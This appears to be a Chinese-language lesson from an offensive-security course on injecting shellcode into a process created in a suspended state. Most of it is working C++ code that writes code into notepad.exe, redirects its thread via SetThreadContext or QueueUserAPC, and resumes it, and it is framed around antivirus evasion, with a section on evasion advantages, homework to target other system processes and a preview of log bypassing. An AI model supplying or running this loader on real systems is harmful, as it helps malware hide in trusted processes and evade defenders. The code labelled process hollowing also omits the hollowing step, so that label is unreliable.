# 课时08：进程挂起注入执行ShellCode

## 1. 课程概述

### 1.1 学习目标

- 理解进程挂起状态的原理
- 掌握Process Hollowing技术
- 学会在挂起进程中注入ShellCode
- 理解如何绕过进程创建监控

---

## 2. 名词解释

| 术语 | 说明 |
|------|------|
| **CREATE_SUSPENDED** | 创建挂起状态的进程 |
| **Process Hollowing** | 指空目标进程内存并替换代码 |
| **Thread Context** | 线程上下文，包含寄存器状态 |
| **ResumeThread** | 恢复挂起的线程 |

---

## 3. 技术原理

```
1. 创建挂起状态的合法进程 (svchost.exe等)
2. 进程未执行任何代码
3. 向目标进程写入ShellCode
4. 修改入口点或线程上下文
5. 恢复线程执行
```

---

## 4. 实现代码

### 4.1 基本挂起进程注入

```cpp
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    // x64 shellcode
    0x48, 0x31, 0xC9,             // xor rcx, rcx
    0x48, 0x83, 0xC4, 0x28,       // add rsp, 0x28
    0xC3                          // ret
};

int main() {
    printf("========== Process Hollowing Injection ==========\n");
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    // 1. 创建挂起状态的进程
    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED,
            NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed\n");
        return 1;
    }
    
    printf("[+] Created suspended process, PID: %lu\n", pi.dwProcessId);
    
    // 2. 分配内存
    LPVOID pRemote = VirtualAllocEx(
        pi.hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    
    if (!pRemote) {
        printf("[-] VirtualAllocEx failed\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    printf("[+] Allocated memory at: 0x%p\n", pRemote);
    
    // 3. 写入ShellCode
    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess, pRemote, shellcode, 
                            sizeof(shellcode), &written)) {
        printf("[-] WriteProcessMemory failed\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    printf("[+] Written %zu bytes\n", written);
    
    // 4. 获取线程上下文
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    printf("[*] Original RIP: 0x%llX\n", ctx.Rip);
    
    // 5. 修改RIP指向我们的ShellCode
    ctx.Rip = (DWORD64)pRemote;
    SetThreadContext(pi.hThread, &ctx);
    
    printf("[+] RIP modified to: 0x%llX\n", ctx.Rip);
    
    // 6. 恢复线程
    printf("[*] Resuming thread...\n");
    ResumeThread(pi.hThread);
    
    // 等待一下观察结果
    WaitForSingleObject(pi.hProcess, 5000);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    printf("[+] Done!\n");
    return 0;
}
```

### 4.2 使用QueueUserAPC的方式

```cpp
// 使用APC而不是修改上下文
if (!QueueUserAPC((PAPCFUNC)pRemote, pi.hThread, 0)) {
    printf("[-] QueueUserAPC failed\n");
    return 1;
}

// 必须恢复线程才APC会执行
ResumeThread(pi.hThread);
```

---

## 5. 免杀优势

- 利用合法进程身份
- 挂起状态时无法检测行为
- 可选择可信的系统进程

---

## 6. 课后作业

1. 实现挂起进程注入并弹出计算器
2. 尝试注入到不同的系统进程
3. 对比APC和Context修改的效果

---

## 7. 下一课预告

下一课我们将学习**“Windows日志绕过”**。
